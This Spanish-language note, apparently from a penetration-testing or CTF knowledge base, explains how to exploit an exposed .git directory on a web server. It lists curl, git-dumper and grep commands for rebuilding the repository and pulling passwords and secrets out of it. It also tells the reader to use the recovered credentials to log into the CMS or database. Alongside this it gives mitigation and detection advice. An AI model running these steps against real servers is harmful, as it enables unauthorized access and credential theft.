---
topic: Git — repositorio expuesto y recuperación de fuente
tags: [web, git, source-code, credentials, git-dumper]
---

# Git — repositorio expuesto y recuperación de fuente

[🌐 English](git-directory-disclosure.en.md) | **Español**

## Concepto

Un `.git` accesible permite reconstruir el repositorio, leer el historial y recuperar configuración que nunca debió publicarse. Es una fuga de código y, a menudo, de credenciales de base de datos o claves de API.

## Cuándo aplica

- `/.git/HEAD` responde 200.
- El servidor no bloquea archivos ocultos.
- El repositorio contiene configuración de despliegue.

## Procedimiento

1. Confirmar el repositorio con `curl` o `nmap http-git`.
2. Reconstruirlo con `git-dumper`.
3. Revisar `git log`, ramas y `settings.php`/`.env`.
4. Usar las credenciales para entrar al CMS o a la base.

## Comandos

```bash
curl -s http://<HOST>/.git/HEAD
git-dumper http://<HOST>/.git repo
git -C repo log --all --oneline
grep -R "password\|mysql://\|SECRET" repo
```

## Variantes

- `.svn` o `.hg` expuestos.
- Backups `settings.php.bak`.
- Tokens en commits antiguos.

## Limitaciones

- El servidor puede devolver 404 para objetos sueltos.
- El repositorio puede estar vacío o sin configuración.
- Las credenciales pueden estar rotadas.

## Mitigación

- Bloquear `.git` en el servidor web.
- No incluir secretos en el repositorio; usar variables de entorno.
- Rotar credenciales si se expone.

## Detección

- Peticiones a `/.git/` y objetos Git.
- Descargas de `pack` o `HEAD` desde Internet.
- Uso de credenciales del repositorio desde IPs no habituales.

## Referencias

- [git-dumper — GitHub](https://github.com/arthaud/git-dumper)
- [0xdf — Dog](https://0xdf.gitlab.io/2025/07/12/htb-dog.html)
- [Git — security](https://git-scm.com/book/en/v2/Git-on-the-Server-Security)
